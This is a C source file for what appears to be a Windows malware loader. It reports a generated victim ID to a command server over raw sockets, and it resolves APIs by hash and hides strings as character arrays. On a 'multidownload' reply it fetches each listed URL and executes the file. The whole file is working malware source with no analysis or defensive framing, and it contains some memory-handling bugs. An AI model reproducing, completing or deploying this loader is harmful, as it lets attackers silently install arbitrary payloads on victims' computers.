#include "imbicili.h"
#include "Loader.h"
#include "md5.h"

SOCKET MyConnect1( char *Host, int Port )
{
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname( (const char*)Host );

	if ( lpHost == NULL )
	{
		return -1;
	}

	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

	if( Socket == -1 )
	{
		return -1;
	}

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS( (unsigned short)Port );

	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket(Socket);
		return -1;
	}

	return Socket;
}


bool ParseUrl1( char *Url, char **Server, char **Path, int *Port )
{
	char *Ptr1 = NULL;
	char *Ptr2 = NULL;
	char *Ptr3 = NULL;
	char *Ptr4 = NULL;

	char *Host		   = (char*)MemAlloc( 512 );
	char *OptionalPort = (char*)MemAlloc( 512 );

	if ( Host == NULL ||
		 OptionalPort == NULL )
	{
		return false;
	}

	DWORD dwPort = 0;

	Ptr1 = m_strstr( Url, "://" );

	if( Ptr1 )
	{
		Ptr1 += 3;
	}
	else
	{
		Ptr1 = Url;
	}

    Ptr4 = m_strstr( Ptr1, "/" );
	Ptr2 = m_strstr( Ptr1, ":" );

	if( !Ptr2 )
	{
		*Port = 80;
		Ptr3   = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( Host, Ptr1, Ptr3 - Ptr1 );
		Host[ Ptr3 - Ptr1 ] = '\0';
	}
	else
	{
		Ptr3 = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( OptionalPort, Ptr2 + 1, Ptr3 - Ptr2 );
		m_memcpy( Host, Ptr1, Ptr2 - Ptr1 );

		OptionalPort[ Ptr3 - Ptr2 ] = '\0';
		Host[ Ptr2 - Ptr1 ]			= '\0';

		*Port = m_atoi( OptionalPort );
	}

	MemFree( OptionalPort );

	*Server = Host;
	*Path   = Ptr4;

	return true;
}

char *LoadExe;
bool ReportToPlugin( char *Url )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *Host = NULL;
	char *Path = NULL;
	int   Port = 0;

	if ( !ParseUrl1( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	char Uid[100];
	GenerateUid( Uid );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );

	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	char *UserAgent = NULL;
	UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	if ( UserAgent == NULL )
	{
		MemFree( UserAgent );
		UserAgent = "-";
	}

	char Request[] = "POST %s HTTP/1.0\r\n"
					 "Host: %s\r\n"
					 "User-Agent: %s\r\n"
					 "Accept: text/html\r\n"
					 "Connection: Close\r\n"
					 "Content-Type: application/x-www-form-urlencoded\r\n"
					 "Content-Length: %d\r\n\r\n";
	
	char Args[]	   = "id=";

	char *HttpPacket = NULL;
	HttpPacket = (char*)MemAlloc( 2048 );
	int iTmp;
	if (LoadExe!=NULL)	
	{
		iTmp=m_lstrlen(LoadExe); 
	}else iTmp=9;

	pwsprintfA( HttpPacket, Request, Path, Host, UserAgent, m_lstrlen( Args ) + m_lstrlen( Uid )+iTmp );
	m_lstrcat( HttpPacket, Args );
	m_lstrcat( HttpPacket, Uid  );
 if (LoadExe==NULL)
  {   
   LoadExe = (char*)MemAlloc(10); 
   m_lstrncpy(LoadExe,"&plugins=",9);
 LoadExe[9]='\0';
  }
	m_lstrcat( HttpPacket, LoadExe  );

	SOCKET Socket = MyConnect1( Host, Port );

	if( Socket == -1 )
	{
		return false;
	}

	bool b = MySend( Socket, (const char *)HttpPacket, m_lstrlen( HttpPacket ) );

	MemFree( HttpPacket );

	if ( !b )
	{
		return false;
	}

	DWORD dwSize = 0;

	char *Buffer = RecvAndParse( Socket, &dwSize );

	if ( !Buffer )
	{
		pclosesocket( Socket );
		return false;
	}

	char MultiDownloadCommand[]={'m','u','l','t','i','d','o','w','n','l','o','a','d',0};
	char *Context;
	m_strtok_s( Buffer, "\r\n", &Context );

	if ( !m_lstrncmp( Buffer, MultiDownloadCommand, m_lstrlen( MultiDownloadCommand ) ) )
	{
		char * cPointer= m_strstr(&Buffer[1],"http:");
		
		
		char* cUrl=Buffer;
		char* cUrlNext;
		int i;
		char *DownloadUrl;
		while (true)
		{
			cUrl= m_strstr(&cUrl[1],"http:");
			if (cUrl==NULL)break;
			cUrlNext= m_strstr(cUrl,"|");
			i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
			DownloadUrl = (char*)MemAlloc(i)+1; 
			m_lstrncpy(DownloadUrl,cUrl,i);
			DownloadUrl[i]='\0';
			

			if ( DownloadUrl )
			{
				LoadExe=(char*)MemRealloc(LoadExe,33+m_lstrlen(LoadExe)+1);
				m_lstrcat( LoadExe, MD5StrFromBuf(DownloadUrl, STRA::Length(DownloadUrl)).t_str());
				m_lstrcat( LoadExe, "|");


				WCHAR *FileName =(WCHAR *)GetTempName();

				if ( FileName && DownloadUrl )
				{
					ExecuteFile( DownloadUrl, FileName );
				}

				MemFree( FileName );
			}
		
			MemFree( DownloadUrl );
		}
	}
		MemFree( Buffer );
	pclosesocket( Socket );

	return true;
}
